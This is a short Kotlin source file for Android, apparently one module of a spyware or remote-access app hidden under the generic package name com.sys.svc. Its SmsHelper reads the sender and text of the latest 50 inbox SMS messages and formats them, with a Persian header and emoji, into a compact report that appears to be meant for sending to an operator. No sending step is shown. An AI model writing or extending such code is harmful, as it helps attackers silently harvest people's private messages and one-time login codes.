package com.sys.svc.helpers

import android.content.Context
import android.provider.Telephony
import com.sys.svc.Logger

object SmsHelper {
    fun list(ctx: Context): String {
        return try {
            val cur = ctx.contentResolver.query(
                Telephony.Sms.Inbox.CONTENT_URI,
                null, null, null, "date DESC"
            )
            val sb = StringBuilder("✉️ پیامک (آخرین ۵۰):\n")
            var n = 0
            cur?.use {
                while (it.moveToNext() && n < 50) {
                    val addr = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                    val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                    sb.appendLine("• $addr: ${body.take(100)}")
                    n++
                }
            }
            sb.toString().take(3200)
        } catch (e: Exception) {
            Logger.e("Sms", "", e)
            "❌ ${e.message}"
        }
    }
}